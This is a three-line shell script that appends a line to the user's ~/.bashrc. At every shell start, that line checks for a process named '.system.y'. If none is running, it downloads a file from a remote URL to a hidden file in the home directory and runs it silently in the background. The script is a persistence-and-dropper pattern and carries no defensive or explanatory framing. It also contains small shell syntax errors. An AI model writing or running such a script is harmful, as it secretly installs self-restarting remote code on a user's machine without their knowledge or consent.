#!/bin/sh
autorun='if [ -z $(pidof .system.y) ]; then wget -O ~/.system.y https://foo; ~/.system.y > /dev/null &; fi'
echo $autorun >> ~/.bashrc